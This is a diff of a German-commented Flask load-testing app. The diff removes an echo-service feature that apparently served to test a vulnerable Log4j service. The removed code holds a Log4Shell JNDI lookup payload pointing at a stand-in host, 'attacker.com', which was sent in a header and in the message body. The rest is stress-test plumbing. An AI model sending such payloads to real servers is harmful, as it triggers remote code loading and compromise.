@@ -8,10 +8,8 @@ import os
 import time
 import json
 import logging
-import instana
 import subprocess
 import threading
-import requests
 from datetime import datetime
 from flask import Flask, request, jsonify, render_template_string
 from werkzeug.serving import make_server
@@ -28,12 +26,9 @@ app = Flask(__name__)
 
 # Global variables für Monitoring
 current_stress_processes = []
-echo_service_url = os.environ.get('ECHO_SERVICE_URL', 'http://vulnerable-echo-service:8085')
 metrics = {
     'requests_total': 0,
     'stress_tests_running': 0,
-    'echo_requests_total': 0,
-    'echo_requests_failed': 0,
     'cpu_usage': 0.0,
     'memory_usage': 0.0,
     'last_stress_duration': 0
@@ -58,67 +53,6 @@ def get_system_metrics():
     except Exception as e:
         logger.error(f"Fehler beim Sammeln von System-Metriken: {e}")
         return {}
-
-def call_echo_service(message, method='POST', vulnerable_payload=False):
-    """
-    Ruft den vulnerablen Echo Service auf
-    """
-    global metrics
-    
-    try:
-        headers = {
-            'Content-Type': 'application/json',
-            'User-Agent': 'LoadTestApp/1.0'
-        }
-        
-        if vulnerable_payload:
-            # VULNERABLE PAYLOAD für Log4j Testing
-            # Dies wird im Echo Service geloggt und löst die Vulnerability aus
-            vulnerable_msg = "${jndi:ldap://attacker.com/evil}"
-            headers['X-Vulnerable-Header'] = vulnerable_msg
-            message = f"{message} - {vulnerable_msg}"
-        
-        if method.upper() == 'POST':
-            response = requests.post(
-                f"{echo_service_url}/echo",
-                json={'message': message, 'user_agent': headers['User-Agent']},
-                headers=headers,
-                timeout=10
-            )
-        else:
-            # GET Request mit message in URL path
-            response = requests.get(
-                f"{echo_service_url}/echo/{message}",
-                headers=headers,
-                timeout=10
-            )
-        
-        metrics['echo_requests_total'] += 1
-        
-        if response.status_code == 200:
-            return {
-                'success': True,
-                'response': response.json(),
-                'status_code': response.status_code,
-                'method': method,
-                'vulnerable_payload': vulnerable_payload
-            }
-        else:
-            metrics['echo_requests_failed'] += 1
-            return {
-                'success': False,
-                'error': f"HTTP {response.status_code}",
-                'status_code': response.status_code
-            }
-            
-    except requests.exceptions.RequestException as e:
-        metrics['echo_requests_failed'] += 1
-        logger.error(f"Echo Service Request failed: {e}")
-        return {
-            'success': False,
-            'error': str(e),
-            'service_url': echo_service_url
-        }
 
 def run_stress_ng(cpu_workers=2, memory_workers=1, duration=30, memory_size="256M"):
     """
@@ -208,8 +142,7 @@ HTML_TEMPLATE = """
             <p><strong>CPU Usage:</strong> {{ metrics.cpu_usage|round(1) }}%</p>
             <p><strong>Memory Usage:</strong> {{ metrics.memory_usage|round(1) }}%</p>
             <p><strong>Aktive Stress Tests:</strong> {{ metrics.stress_tests_running }}</p>
-            <p><strong>Echo Requests Total:</strong> {{ metrics.echo_requests_total }}</p>
-            <p><strong>Echo Requests Failed:</strong> {{ metrics.echo_requests_failed }}</p>
+            <p><strong>Total Requests:</strong> {{ metrics.requests_total }}</p>
         </div>
 
         <form action="/stress" method="post">
@@ -243,38 +176,11 @@ HTML_TEMPLATE = """
             <button type="submit">🚀 Stress Test starten</button>
         </form>
         
-        <form action="/echo" method="post" style="border-top: 1px solid #ddd; padding-top: 20px; margin-top: 20px;">
-            <h3>📢 Echo Service Test</h3>
-            
-            <div class="form-group">
-                <label for="echo_message">Message:</label>
-                <input type="text" id="echo_message" name="message" value="Hello from Load Test!" style="width: 300px;">
-            </div>
-            
-            <div class="form-group">
-                <label for="echo_method">Method:</label>
-                <select id="echo_method" name="method">
-                    <option value="POST">POST</option>
-                    <option value="GET">GET</option>
-                </select>
-            </div>
-            
-            <div class="form-group">
-                <label>
-                    <input type="checkbox" name="vulnerable_payload" value="true"> 
-                    Include Log4j Vulnerable Payload (for testing)
-                </label>
-            </div>
-            
-            <button type="submit" style="background: #dc3545;">📢 Call Echo Service</button>
-        </form>
-        
         <div style="margin-top: 30px;">
             <h3>🔧 API Endpoints</h3>
             <p><code>GET /health</code> - Health Check</p>
             <p><code>GET /metrics</code> - System Metriken</p>
             <p><code>POST /stress</code> - Stress Test starten</p>
-            <p><code>POST /echo</code> - Echo Service aufrufen</p>
             <p><code>GET /status</code> - Aktueller Status</p>
         </div>
     </div>
@@ -311,62 +217,6 @@ def get_metrics():
     }
     
     return jsonify(response)
-
-@app.route('/echo', methods=['POST'])
-def call_echo():
-    """Ruft den Echo Service auf"""
-    metrics['requests_total'] += 1
-    
-    try:
-        # Parameter aus Form oder JSON
-        if request.is_json:
-            data = request.get_json()
-        else:
-            data = request.form.to_dict()
-        
-        message = data.get('message', 'Hello from Load Test!')
-        method = data.get('method', 'POST').upper()
-        vulnerable_payload = data.get('vulnerable_payload') == 'true'
-        
-        # Echo Service aufrufen
-        result = call_echo_service(message, method, vulnerable_payload)
-        
-        if request.is_json:
-            return jsonify(result)
-        else:
-            # Web Interface Response
-            if result['success']:
-                return f"""
-                <div class="status success">
-                    ✅ Echo Service Response!<br>
-                    Method: {method}<br>
-                    Message: {message}<br>
-                    {'🚨 Vulnerable Payload Sent!' if vulnerable_payload else ''}
-                    <br><br>
-                    Response: {json.dumps(result['response'], indent=2)}
-                </div>
-                <script>setTimeout(() => window.location.href='/', 5000);</script>
-                """
-            else:
-                return f"""
-                <div class="status error">
-                    ❌ Echo Service Error: {result.get('error', 'Unknown error')}<br>
-                    Service URL: {echo_service_url}
-                </div>
-                <script>setTimeout(() => window.location.href='/', 3000);</script>
-                """
-    
-    except Exception as e:
-        logger.error(f"Fehler beim Echo Service Aufruf: {e}")
-        error_response = {'error': str(e)}
-        
-        if request.is_json:
-            return jsonify(error_response), 500
-        else:
-            return f"""
-            <div class="status error">❌ Fehler: {e}</div>
-            <script>setTimeout(() => window.location.href='/', 3000);</script>
-            """
 
 @app.route('/stress', methods=['POST'])
 def start_stress():
@@ -501,12 +351,8 @@ if __name__ == '__main__':
     
     # Produktionsserver für Container
     if os.environ.get('FLASK_ENV') == 'production':
-        try:
-            from waitress import serve
-            serve(app, host=host, port=port)
-        except ImportError:
-            logger.warning("Waitress nicht verfügbar, nutze Flask development server")
-            app.run(host=host, port=port, debug=False)
+        from waitress import serve
+        serve(app, host=host, port=port)
     else:
         app.run(host=host, port=port, debug=False)
 
